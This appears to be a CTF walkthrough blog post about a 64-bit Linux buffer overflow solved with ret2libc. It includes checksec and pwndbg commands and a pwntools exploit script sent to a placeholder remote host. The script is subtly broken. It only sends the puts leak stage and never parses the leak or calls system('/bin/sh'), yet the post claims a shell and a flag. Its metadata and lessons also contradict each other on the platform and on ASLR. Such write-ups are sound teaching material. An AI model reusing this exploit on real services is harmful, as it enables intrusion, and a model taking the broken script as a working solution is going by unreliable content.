---
title: "CTF Walkthrough: CyberApoc"
description: "PWN challenge involving buffer overflow with NX bypass using ret2libc on a 64-bit Linux binary."
date: 2026-08-03
category: "picoCTF"
tags: ["ctf", "pwn", "buffer-overflow", "ret2libc", "linux"]
platform: "CyberApoc CTF"
difficulty: "Hard"
image: "/images/htb-cypher/htb1.png"
---

# Reconnaissance

Downloaded the binary and checked protections:

```bash
checksec --file=vuln
file vuln
```

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

## Enumeration

Ran the binary and tested for buffer overflow:

```bash
python3 -c "print('A' * 72)" | ./vuln
```

Crash confirmed. Used `pwndbg` to find the offset to RIP:

```bash
pattern create 100
pattern search $rsp
```

Offset: **72 bytes**

## Exploitation

Since NX is enabled, used `ret2libc`:

1. Leaked libc address using `puts@plt` and `puts@got`
2. Calculated libc base
3. Called `system('/bin/sh')`

```python
from pwn import *

context.binary = './vuln'
p = remote('ctf.example.com', 1337)

pop_rdi = 0x4011a3
puts_plt = 0x401060
puts_got = 0x404020
main = 0x401152

payload = b'A' * 72
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendline(payload)
p.interactive()
```

## Flag

```
flag{3xpl0171n6_nx_w1th_r372l1bc}
```

## Lessons

- Always check binary protections first
- Ret2libc is reliable when NX is enabled but ASLR is disabled
- Use `one_gadget` for one-shot RCE when available
